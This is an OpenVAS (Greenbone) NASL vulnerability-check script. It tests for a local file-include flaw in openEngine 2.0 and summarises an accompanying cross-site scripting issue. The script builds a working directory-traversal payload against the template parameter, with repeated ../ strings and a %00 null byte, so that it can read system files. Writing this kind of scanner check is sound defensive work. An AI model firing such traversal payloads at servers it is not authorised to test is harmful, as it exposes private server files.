###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_openengine_lfi_12_10.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# openEngine Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "openEngine is prone to a local file-include vulnerability and a cross-site
scripting vulnerability because it fails to properly sanitize user-supplied
input.

An attacker can exploit the local file-include vulnerability using
directory-traversal strings to view and execute local files within the context
of the webserver process. Information harvested may aid in further attacks.

The attacker may leverage the cross-site scripting issue to execute arbitrary
script code in the browser of an unsuspecting user in the context of the
affected site. This may let the attacker steal cookie-based authentication
credentials and launch other attacks.

openEngine 2.0 100226 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100880);
 script_version("$Revision: 7577 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2010-10-29 12:58:08 +0200 (Fri, 29 Oct 2010)");
 script_bugtraq_id(44888);
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");

 script_name("openEngine Local File Include Vulnerability");

 script_xref(name : "URL" , value : "http://www.openengine.de");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_openengine_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"openengine"))exit(0);
files = traversal_files();

foreach file (keys(files)) {

  url = string(dir,"/cms/website.php?template=",crap(data:"../",length:3*9),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url, pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}
exit(0);
